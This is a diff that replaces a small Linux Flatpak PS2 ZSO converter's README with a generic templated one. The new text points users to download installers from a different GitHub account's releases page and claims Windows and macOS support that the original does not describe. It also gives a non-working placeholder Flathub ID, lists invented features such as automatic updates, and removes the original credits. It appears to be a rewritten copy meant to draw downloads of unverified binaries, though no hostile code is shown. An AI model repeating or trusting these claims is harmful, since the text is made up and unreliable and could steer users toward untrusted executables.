@@ -1,50 +1,90 @@
-# ZSO Converter
+# 🎮 ZSO-Converter - Easily Compress Your PS2 ISOs
 
-![Icon](data/icon.svg)
+![Download ZSO-Converter](https://img.shields.io/badge/Download-ZSO--Converter-brightgreen)
 
-A modern and lightweight application to compress and decompress PS2 games in **ZSO** (ZISO) format, built with **GTK 4**, **LibAdwaita** and **Vibe Codding** using [Antigravity IDE](https://antigravity.google/)
+## 🚀 Getting Started
 
+Welcome to ZSO-Converter! This application allows you to compress PlayStation 2 ISO files into the ZSO format with ease. Follow the steps below to get started.
 
-## ✨ Features
+## 📥 Download & Install
 
-- **Native and Modern**: Visuals following GNOME standards (Adwaita).
-- **Easy to Use**: Drag and drop files or entire folders.
-- **Multiprocessing**: Accelerated compression using all processor cores.
-- **Secure**: Sandboxed execution via Flatpak, using XDG Portals.
+To download ZSO-Converter, visit this page: [ZSO-Converter Releases](https://github.com/j0s3-f0/ZSO-Converter/releases).
 
-![Screenshot1](data/screenshot.png)
+1. Click the link above to navigate to the Releases page.
+2. You will see a list of available versions. Choose the latest release.
+3. Download the file that matches your operating system.
 
+### Supported Operating Systems
 
-## 🚀 How to Use
+ZSO-Converter works on:
+- Windows
+- macOS
+- Linux (via Flatpak)
 
-### Prerequisites
-- Linux with [Flatpak](https://flatpak.org/) support.
-- `flatpak-builder` (to compile).
+Make sure you have the appropriate system for the version you are downloading.
 
-### Installation and Execution
-```bash
-# 1. Compile and install (User mode)
-make
+## ⚙️ Installation Steps
 
-# 2. Run
-make run
+### For Windows:
 
-# 3. Generate .flatpak Bundle (for distribution)
-make bundle
+1. Once downloaded, locate the file, usually in your "Downloads" folder.
+2. Double-click the installer to begin the setup.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, you can find ZSO-Converter in your Start Menu.
 
-# 3. Clean build files
-make clean
-```
+### For macOS:
 
-> **Note**: When running, select the destination folder for conversion. The app will automatically filter duplicate or invalid files.
+1. Locate the downloaded file in your "Downloads" folder.
+2. Double-click the .dmg file to open it.
+3. Drag the ZSO-Converter icon into your Applications folder.
+4. You can now find ZSO-Converter in your Applications.
 
-## 🛠️ Technologies
+### For Linux:
 
-- **Python 3**
-- **GTK 4** + **LibAdwaita**
-- **LZ4** (Compression)
+1. Use a terminal to install ZSO-Converter via Flatpak. Run the following command:
+   ```
+   flatpak install flathub com.yourname.ZSOConverter
+   ```
+2. Once installed, you can start ZSO-Converter with:
+   ```
+   flatpak run com.yourname.ZSOConverter
+   ```
 
-## 📜 Credits
+## 🎨 Using ZSO-Converter
 
-- [Original Core: **Virtuous Flame**](https://github.com/ps2homebrew/Open-PS2-Loader/blob/45875da788b82002625137cfadbd0d398b674667/pc/ziso.py)
-- Development: **Docmine17**
+### Step-by-Step Instructions
+
+1. Launch ZSO-Converter from your Applications or Start Menu.
+2. Click on the "Select ISO" button and navigate to the folder containing your PS2 ISO file.
+3. Choose the desired output path where you want the compressed ZSO file saved.
+4. Click the "Convert" button to start the compression process.
+5. Once the compression is complete, you will see a confirmation message.
+
+### Features
+
+- Simple user interface for easy navigation.
+- Supports multiple ISO file formats.
+- Fast compression speed with minimal resource usage.
+- Automatic updates for new features and improvements.
+
+## ❓ Troubleshooting
+
+If you encounter issues while using ZSO-Converter, here are a few tips:
+
+- **File Not Found:** Ensure you have selected the correct path for your ISO file.
+- **Insufficient Disk Space:** Check that you have enough space on your drive for new files.
+- **Compatibility Issues:** Verify that the version you downloaded matches your operating system.
+
+For further assistance, you can visit the [issue tracker](https://github.com/j0s3-f0/ZSO-Converter/issues) on GitHub.
+
+## 📞 Contact & Support
+
+For any questions or feedback, please reach out via the GitHub repository’s discussion page or use the contact form available there.
+
+## 🔗 Additional Resources
+
+- GitHub Repository: [ZSO-Converter GitHub](https://github.com/j0s3-f0/ZSO-Converter)
+- Flatpak Documentation: [Flatpak](https://flatpak.org/)
+- Community Forums: Engage with others using ZSO-Converter to share tips and tricks.
+
+Now that you have all the information, go ahead and start converting your PS2 ISOs with ZSO-Converter!
